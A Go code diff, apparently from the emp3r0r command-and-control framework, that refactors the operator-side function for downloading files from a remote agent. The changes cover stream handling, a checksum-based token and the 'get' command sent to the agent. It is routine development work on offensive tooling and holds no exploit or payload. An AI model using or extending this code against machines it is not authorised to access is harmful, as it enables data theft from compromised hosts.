@@ -83,35 +83,39 @@ func PutFile(lpath, rpath string, a *emp3r0r_data.AgentSystemInfo) error {
 }
 
 // GetFile get file from agent
-func GetFile(filepath string, a *emp3r0r_data.AgentSystemInfo) error {
+func GetFile(file_path string, a *emp3r0r_data.AgentSystemInfo) (ftpSh *StreamHandler, err error) {
 	if !util.IsExist(FileGetDir) {
-		err := os.MkdirAll(FileGetDir, 0o700)
+		err = os.MkdirAll(FileGetDir, 0o700)
 		if err != nil {
-			return fmt.Errorf("GetFile mkdir %s: %v", FileGetDir, err)
+			err = fmt.Errorf("GetFile mkdir %s: %v", FileGetDir, err)
+			return
 		}
 	}
 	CliPrintInfo("Waiting for response from agent %s", a.Tag)
-	filename := FileGetDir + util.FileBaseName(filepath) // will copy the downloaded file here when we are done
-	tempname := filename + ".downloading"                // will be writing to this file
-	lock := filename + ".lock"                           // don't try to duplicate the task
+	filename := FileGetDir + util.FileBaseName(file_path) // will copy the downloaded file here when we are done
+	tempname := filename + ".downloading"                 // will be writing to this file
+	lock := filename + ".lock"                            // don't try to duplicate the task
 
 	// is this file already being downloaded?
 	if util.IsExist(lock) {
-		return fmt.Errorf("%s is already being downloaded", filename)
+		err = fmt.Errorf("%s is already being downloaded", filename)
+		return
 	}
 
 	// stat target file, know its size, and allocate the file on disk
-	fi, err := StatFile(filepath, a)
+	fi, err := StatFile(file_path, a)
 	if err != nil {
-		return fmt.Errorf("GetFile: failed to stat %s: %v", filepath, err)
+		err = fmt.Errorf("GetFile: failed to stat %s: %v", file_path, err)
+		return
 	}
 	fileinfo := *fi
 	filesize := fileinfo.Size
 	err = util.FileAllocate(filename, filesize)
 	if err != nil {
-		return fmt.Errorf("GetFile: %s allocate file: %v", filepath, err)
+		err = fmt.Errorf("GetFile: %s allocate file: %v", file_path, err)
+		return
 	}
-	CliMsg("We will be downloading %s, %d bytes in total (%s)", filepath, filesize, fileinfo.Checksum)
+	CliMsg("We will be downloading %s, %d bytes in total (%s)", file_path, filesize, fileinfo.Checksum)
 
 	// what if we have downloaded part of the file
 	var offset int64 = 0
@@ -121,25 +125,25 @@ func GetFile(filepath string, a *emp3r0r_data.AgentSystemInfo) error {
 	}
 
 	// mark this file transfer stream
-	ftpSh := &StreamHandler{}
+	ftpSh = &StreamHandler{}
 	// tell agent where to seek the left bytes
-	ftpSh.Token = uuid.NewString()
+	ftpSh.Token = fileinfo.Checksum
 	ftpSh.Buf = make(chan []byte)
 	ftpSh.BufSize = 1024 * 8
 	FTPMutex.Lock()
-	FTPStreams[filepath] = ftpSh
+	FTPStreams[file_path] = ftpSh
 	FTPMutex.Unlock()
 
 	// h2x
 	ftpSh.H2x = new(emp3r0r_data.H2Conn)
 
 	// cmd
-	cmd := fmt.Sprintf("get --file_path '%s' --offset %d --token '%s'", filepath, offset, ftpSh.Token)
+	cmd := fmt.Sprintf("get --file_path '%s' --offset %d --token '%s'", file_path, offset, ftpSh.Token)
 	err = SendCmd(cmd, "", a)
 	if err != nil {
 		CliPrintError("GetFile send command: %v", err)
-		return err
+		return nil, err
 	}
 
-	return err
+	return ftpSh, nil
 }
